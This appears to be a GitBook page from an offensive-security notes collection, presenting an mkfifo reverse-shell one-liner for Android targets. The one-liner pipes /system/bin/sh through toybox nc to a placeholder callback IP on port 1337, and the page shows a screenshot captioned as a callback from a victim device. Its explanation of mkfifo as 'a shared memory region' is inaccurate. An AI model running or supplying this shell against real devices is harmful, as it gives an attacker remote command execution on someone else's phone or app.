---
description: 06/17/2024
cover: https://y.yarn.co/3fe0745c-8406-4773-ab65-c27b3b1190ad_text.gif
coverY: -14
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 📵 Reverse Shells

## Every Hacker Needs Good Reverse Shells to Complete the Mission...

### Mkfifo

A solid reverse shell and somewhat mandatory one to make living-off-the-land (LOL) easier, is an `mkfifo` reverse shell which is essentially a shared memory region for one or more applications or connections simultaneously.&#x20;

`mkfifo` stands for make first-in-first-out.

**PoC:**

```
"rm /data/data/com.target.application/f;/system/bin/toybox mkfifo /data/data/com.target.application/f;cat /data/data/com.target.application/f|/system/bin/sh -i 2>&1|/system/bin/toybox nc <callback_ip_here> 1337 >/data/data/com.target.application/f"
```

### Result

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption><p>Getting a callback from the victim device</p></figcaption></figure>
